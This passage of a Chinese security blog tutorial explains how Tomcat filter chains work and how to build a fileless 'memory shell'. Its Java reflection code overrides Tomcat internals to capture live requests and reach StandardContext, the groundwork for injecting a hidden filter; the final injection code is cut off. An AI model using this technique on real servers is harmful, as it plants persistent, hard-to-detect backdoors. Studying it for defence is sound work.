class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat会自动扫描到并加载我们编写的filter<br>断点打在编写的doFilter方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723201259.png" alt="image.png"></p><h4 id="请求如何到达Filter"><a href="#请求如何到达Filter" class="headerlink" title="请求如何到达Filter"></a>请求如何到达Filter</h4><p>具体调试过程就不记录了<br>总之调试加阅读tomcat架构原理可以理出以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724003839.png" alt="image.png"><br>Wrapper的最后一个Valve也就是StandardWrapperValve会创建一个Filter链并进行调用</p><h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h4><p>&#x3D;&#x3D;&#x3D;<code>FilterDef</code>&#x3D;&#x3D;是过滤器的抽象定义，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；</p><p>&#x3D;&#x3D;<code>FilterConfigs</code>&#x3D;&#x3D;, <code>FilterDefs</code>只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；</p><p>&#x3D;&#x3D;<code>FilterMaps</code>&#x3D;&#x3D;，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；</p><p>&#x3D;&#x3D;<code>FilterChain</code>&#x3D;&#x3D;是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p><h4 id="FilterChain创建"><a href="#FilterChain创建" class="headerlink" title="FilterChain创建"></a>FilterChain创建</h4><p>FilterChain创建由StandardWrapperValve创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724004559.png" alt="image.png"></p><p>跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724005632.png" alt="image.png"></p><p>可以看见首先是<code>context.findFilterMaps()</code>找到context中已经存在的<code>FilterMaps</code>, 再遍历<code>FilterMaps</code>, 由<code>FilterMap</code>在已存在的filterConfigs中找到具体的<code>filterConfig</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010043.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010115.png" alt="image.png"></p><p>由于Filter是&#x3D;&#x3D;动态创建&#x3D;&#x3D;的, 要打入内存马的话, 理论上反射修改这两个map就可以了</p><p>对于FilterMap, StandardContext提供了两个方法来直接添加</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010715.png" alt="image.png"><br>看上层接口注释, 其中<code>addFilterMapBefore</code>可以将FilterMap放在第一位<br>需要注意的是, 这两个方法都要经过<code>validateFilterMap</code>的验证, 主要是验证是否存在对应的<code>FilterDef</code>, 所以还要反射修改对应的<code>filterDefs</code></p><h4 id="内存马构造"><a href="#内存马构造" class="headerlink" title="内存马构造"></a>内存马构造</h4><h5 id="获取-StandardContext对象"><a href="#获取-StandardContext对象" class="headerlink" title="获取 StandardContext对象"></a>获取 <code>StandardContext</code>对象</h5><p>想要修改&#x3D;&#x3D;<code>StandardContext</code>&#x3D;&#x3D;中的&#x3D;&#x3D;<code>FilterMap</code>, <code>FilterDefs</code>, <code>FilterConfigs</code>&#x3D;&#x3D;, 就必须先拿到当前的<code>StandardContext</code>, 假如有这样一个反序列化入口, 我们想拿到<code>StandardContext</code>, 大部分文章都是从request入手<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215414.png" alt="image.png"></p><p>request对象上层接口可以获取当前session<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215733.png" alt="image.png"><br>而session的上层接口定义了它可以获取ServletContext<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215837.png" alt="image.png"></p><p>当然这只是一层接口, 实际上拿到的类有没有实现这几个接口, 返回的对象具体是什么类型, 还得去调试看看</p><p>可以看见<br>我们真正拿到的类是一个<code>RequestFacade</code> 这是[[Facade模式]]运用, </p><p>其目的是屏蔽tomcat核心接口(例如直接动态得插入filter等), 只暴露允许用户操作的接口</p><p>直接转到类中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231413.png" alt="image.png"></p><p><code>RequestFacade</code>是<code>HttpServletRequest</code>的实现类, <code>HttpServletRequest</code>是<code>ServletRequest</code>的实现类<br><code>RequestFacade</code>实现了<code>getServletContext()</code>方法, 返回了一个<code>ServletContext</code>,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231800.png" alt="image.png"><br>具体返回的是什么类, 也得调试看一下<br>写个demo看一下,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233413.png" alt="image.png"></p><p>拿到的其实是<code>org.apache.catalina.core.ApplicationContextFacade</code>, 依旧是[[Facade模式]]的Facade<br>找到这个类, 看一下结构有一个<code>ApplicationContext</code>类型的属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233112.png" alt="image.png"><br>再深入<code>ApplicationContext</code>里存着<code>StandardContext</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233152.png" alt="image.png"></p><p>梳理一下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726004757.png" alt="image.png"></p><p>这样确实能拿到StandardContext, 但是实际打内存马的时候是类加载, 从哪去找这个RequestFacade对象?</p><h6 id="通过lastServicedRequest"><a href="#通过lastServicedRequest" class="headerlink" title="通过lastServicedRequest"></a>通过<code>lastServicedRequest</code></h6><blockquote><p>为了<strong>在 filter&#x2F;servlet 执行期间，允许某些外部工具（如 JMX 或调试器）访问当前请求对象</strong>。Tomcat 把 <code>lastServicedRequest</code>&#x2F;<code>Response</code> 放在 <code>ApplicationFilterChain</code> 类中<br>    —来自ai解释</p></blockquote><p>当<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true时, 这里是会放进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010004.png" alt="image.png"><br>这是两个静态属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010252.png" alt="image.png"><br>也就是说可以直接访问到, 因此直接反射修改即可, 但是需要注意的是, 修改<code>WRAP_SAME_OBJECT</code>为true后, 下一次请求才会把request和respone保存进去, 所以想打进去内存马就得发两次请求,<br>第一次请求&#x3D;&#x3D;设置<code>WRAP_SAME_OBJECT</code>为true并为<code>lastServicedRequest</code> <code>lastServicedResponse</code>这两个静态变量赋值&#x3D;&#x3D;,<br>第二次请求&#x3D;&#x3D;触发<code>lastServicedRequest.set(request);</code>并拿到request&#x3D;&#x3D;</p><p>并且如果<code>WRAP_SAME_OBJECT</code>为true一直为true的话,  <code>lastServicedRequest</code>是会被置空的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729163709.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次请求后顺利拿到<code>RequestFacade</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729171612.png" alt="image.png"></p><p>进一步拿到StandardContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729173924.png" alt="image.png"><br>可以看见这里获取的就是我们的StandardContext</p><h6 id="通过Thread"><a href="#通过Thread" class="headerlink" title="通过Thread"></a>通过Thread</h6><p>pass</p><p>接下来就是去修改 <code>FilterDef</code>, <code>FilterConfigs</code>, <code>FilterMaps</code><br>这块主要还是靠自己边看边这几个类的结构边写代码, 我的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span 